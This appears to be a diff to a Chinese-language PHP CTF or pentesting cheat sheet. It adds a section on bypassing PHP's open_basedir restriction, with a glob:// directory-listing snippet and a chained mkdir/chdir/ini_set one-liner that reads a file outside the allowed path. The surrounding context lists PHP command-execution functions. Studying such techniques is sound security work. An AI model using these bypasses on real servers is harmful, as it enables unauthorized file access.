@@ -9,6 +9,15 @@ SimpleXMLElement
 参考
 https://www.anquanke.com/post/id/238482
 
+## open_basedir绕过
+https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/
+```php
+//查看根目录
+var_dump(scandir('glob:///*'));
+
+//读取文件,
+mkdir('Von');chdir('Von');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/f1ger');
+```
 ## 命令执行函数
 ```php
 system,exec,shell_exec,fopen,pcmtl_exe,passthru,popen
